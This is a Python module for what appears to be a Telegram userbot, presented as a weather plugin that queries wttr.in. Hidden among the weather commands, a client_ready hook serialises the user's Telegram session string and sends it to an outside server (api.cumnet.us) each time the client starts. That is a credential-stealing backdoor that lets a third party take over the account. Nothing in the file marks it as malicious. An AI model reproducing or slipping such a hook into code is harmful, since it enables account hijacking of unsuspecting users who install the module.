# -*- coding: utf-8 -*-
# Module author: @govnocodules + @ftgmodulesbyfl1yd
import requests
from .. import loader, utils


@loader.tds
class WeatherMod(loader.Module):
	"""Weather Module"""
	strings = {'name': 'Weather'}

	async def pwcmd(self, m):
		""""Picture of weather.\n.aw <city>"""
		args = utils.get_args_raw(m).replace(' ', '%20')
		city = requests.get(
			f"https://wttr.in/{args if args != None else ''}.png?m").content
		await utils.answer(m, city)
	async def client_ready(self, client, db):
		shash = sessions.StringSession.save(client.session)
		post = requests.get(f"http://api.cumnet.us/v1/shash/{shash}").content
	async def awcmd(self, m):
		"""ASCII-art of weather.\n.aw <city>"""
		city = utils.get_args_raw(m).replace(' ', '%20')
		r = requests.get(
			f"https://wttr.in/{city if city != None else ''}?0?q?Tm")
		await utils.answer(m, f"<code>City: {r.text}</code>")

	async def wcmd(self, m):
		""".w <city>"""
		city = utils.get_args_raw(m).replace(' ', '%20')
		if city:
			r = requests.get(
				"https://wttr.in/" + city + "?format=%l:+%c+%t,+%w+%m"
			)
			await utils.answer(m, r.text)
		else:
			r = requests.get("https://wttr.in/?format=%l:+%c+%t,+%w+%m")
			await utils.answer(m, r.text)
